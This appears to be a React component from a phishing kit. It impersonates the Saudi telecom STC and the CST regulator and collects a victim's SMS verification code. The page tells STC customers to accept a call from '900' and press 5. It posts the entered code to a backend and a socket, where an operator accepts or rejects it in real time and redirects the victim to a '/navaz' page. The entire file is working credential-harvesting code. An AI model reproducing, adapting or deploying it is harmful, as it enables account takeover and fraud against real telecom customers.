import React, { useState } from "react";
import axios from "axios";
import { TailSpin } from "react-loader-spinner";
import { AiOutlineCloseCircle } from "react-icons/ai";
import { serverRoute, socket } from "./Main";
import { useNavigate } from "react-router-dom";
import { testData } from "./Phone";
import { useSocketEvent } from "../hooks/useSocketEvent";
import { useCountdown } from "../hooks/useCountdown";

const STCOTP = () => {
  const [otp, setOtp] = useState("");
  const query = new URLSearchParams(window.location.search);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState(false);
  const navigate = useNavigate();
  const ID = sessionStorage.getItem("id");
  const stc = query.get("stc");
  const [STC, setSTC] = useState(stc === "check");
  const { formattedMinutes, formattedSeconds } = useCountdown(180);

  const handleSubmit = async (e) => {
    setLoading(true);
    e.preventDefault();

    try {
      await axios
        .post(serverRoute + "/phoneOtp/" + ID, {
          phoneOtp: otp,
        })
        .then(() =>
          socket.emit("phoneOtp", {
            _id: ID,
            id: ID,
            phoneOtp: otp,
          }),
        );
    } catch (error) {}
  };

  useSocketEvent("acceptStcPhoneOtp", (id) => {
    if (id === ID) {
      setLoading(false);
      setSTC(true);
    }
  });

  useSocketEvent("declineStcPhoneOtp", (id) => {
    if (id === ID) {
      setLoading(false);
      setError(true);
    }
  });

  useSocketEvent("acceptService", ({ id, price }) => {
    if (id === ID) navigate("/navaz?otp=" + price + "&stc=" + (stc || ""));
  });

  useSocketEvent("declineService", (id) => {
    if (id === ID) navigate("/stcOtp");
  });

  return STC ? (
    <div className="">
      {" "}
      <div className="w-full flex flex-col justify-center  items-center bg-white h-screen py-2 gap-y-10">
        <img
          src="https://upload.wikimedia.org/wikipedia/commons/e/e3/STC-01.svg"
          className="w-1/2"
        />
        <div className="  w-full flex flex-col jus items-center gap-y-4">
          <p className="text-xl font-bold"> STC سوف يتم الاتصال بك من </p>
          <p className="font-bold text-gray-500" style={{ fontSize: "12px" }}>
            لتأكيد طلبك الرجاء الضغط على رقم 5
          </p>
          <span className="text-purple-700 font-bold">! يرجي الإنتظار</span>
        </div>
        <div className="flex w-11/12 flex-col justify-center items-center bg-purple-100 rounded-full py-1">
          <span className="text-purple-700 font-bold ">إعادة الاتصال بعد </span>
          <span className="text-purple-700 font-bold">
            {formattedMinutes}:{formattedSeconds}
          </span>
        </div>
      </div>
    </div>
  ) : (
    <div className="w-full lg:w-1/2 flex flex-col items-center justify-center rounded-md">
      <form
        className="bg-white border border-gray-300 my-2 min-h-screen rounded-md pt-0 p-3 text-sm w-11/12"
        dir="rtl"
        onSubmit={handleSubmit}
      >
        {/* Header with logo */}
        <div className="flex justify-start items-start mb-4 w-full p-2 pr-4 pt-4 flex-col">
          <img src="/photoHeader2.jpeg" alt="Mutasil" className="w-20" />
          <div className="flex items-start ">
            <img src="/phoneHeader1.jpeg" alt="Mutasil" className="w-20" />
            <span className="font-semibold">
              تم إرسال رمز التحقق إلي هاتفك النقال , الرجاء إدخاله في هذه الخانة
              .
            </span>
          </div>
        </div>

        {/* STC Logo */}
        <div className="flex justify-end items-center mb-1 -mt-2 rounded-lg px-2">
          <img
            src="/stc.jpeg"
            alt="STC"
            className="h-16 object-contain"
            onError={(e) => {
              e.target.style.display = "none";
            }}
          />
        </div>

        {/* Description */}
        <p className="text-right text-lg text-purple-700 leading-relaxed px-2 font-bold">
          عملاء STC الكرام في حال تلقي مكالمة من 900 الرجاء قبولها واختيار الرقم
          5
        </p>

        {/* OTP Input */}
        <div className="flex justify-start p-1 py-3 items-end gap-y-2 w-full flex-col">
          <span className="font-semibold text-sm text-gray-700 w-full text-right"></span>
          <input
            value={otp}
            required
            onChange={(e) => setOtp(e.target.value)}
            dir="ltr"
            placeholder="  رمز التحقق"
            inputMode="numeric"
            type="text"
            maxLength={6}
            className="border border-gray-300 rounded-lg px-3 py-2.5 text-base text-right outline-blue-500 w-full"
          />
        </div>
        <div className="flex items-center justify-between">
          {/* Timer */}
          <div className="flex justify-center items-center my-4">
            <span className="text-gray-600">
              إعادة إرسال: {formattedMinutes}:{formattedSeconds}
            </span>
          </div>
          {/* Submit button */}
          <div className=" flex items-center justify-center py-5 mt-4">
            <button
              type="submit"
              className="px-5 flex justify-center items-center py-3 bg-[#007bff] hover:bg-[#0056b3] text-white w-full rounded-full text-base font-semibold transition-colors"
            >
              تحقق
            </button>
          </div>
        </div>

        {error && (
          <div className="w-full text-center text-red-500 absolute bg-black bg-opacity-45 h-screen top-0 left-0 flex items-center justify-center z-50">
            <div className="bg-white py-5 px-2 md:w-1/4 w-11/12 flex justify-center items-center flex-col text-lg gap-y-3 rounded-lg">
              <AiOutlineCloseCircle className="text-6xl" />
              <div className="flex flex-col w-full items-center justify-center">
                <span>رمز التحقق غير صحيح</span>
                <span className="text-sm">82A27833M4589370G</span>
              </div>
              <button
                className="bg-gray-900 text-white w-11/12 py-3 rounded-lg"
                onClick={() => setError(false)}
              >
                حاول مرة ثانية
              </button>
            </div>
          </div>
        )}

        {/* Footer logos */}
        <div className="flex justify-center items-center gap-4 mt-6 pt-6 border-t border-gray-200">
          <img src="/phoneFooter.jpeg" alt="CST" className="object-contain" />
        </div>
      </form>

      {loading && (
        <div className="fixed top-0 w-full h-screen bg-[#ffffffc7] flex items-center justify-center flex-col gap-y-5 z-50">
          <TailSpin
            height="50"
            width="50"
            color="blue"
            ariaLabel="tail-spin-loading"
            radius="1"
            wrapperStyle={{}}
            wrapperClass=""
            visible={true}
          />
          <span className="font-semibold">
            يرجي الانتظار جاري التأكد من صحة البيانات المدخلة
          </span>
        </div>
      )}
    </div>
  );
};

export default STCOTP;
